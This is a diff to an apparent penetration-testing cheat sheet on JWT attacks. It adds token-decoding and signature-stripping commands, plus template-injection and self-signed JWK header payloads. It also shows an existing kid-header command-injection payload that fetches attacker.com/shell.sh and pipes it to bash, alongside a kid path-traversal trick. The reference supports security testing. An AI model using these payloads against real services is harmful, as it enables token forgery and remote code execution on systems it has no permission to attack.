@@ -76,6 +76,19 @@ grep -r "client_secret" *.js
 
 ## JWT
 
+### Quick Commands
+
+```bash
+# Quick decode (no tools)
+echo "eyJhbG..." | cut -d. -f2 | base64 -d | jq
+
+# Signature stripping test
+jwt_tool <token> -X s
+
+# Token with trailing dot (truncated sig)
+# header.payload.
+```
+
 ### Signature Tests
 
 ```bash
@@ -146,6 +159,12 @@ python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
 
 # Command injection
 {"kid": "/dev/null; curl attacker.com/shell.sh | bash"}
+
+# Template injection
+{"alg": "HS256", "kid": "{{config.SECRET_KEY}}"}
+
+# JWK header embedding (self-signed)
+{"alg": "RS256", "jwk": {"kty": "RSA", "n": "attacker_key_n", "e": "AQAB"}}
 ```
 
 ### Claim Manipulation
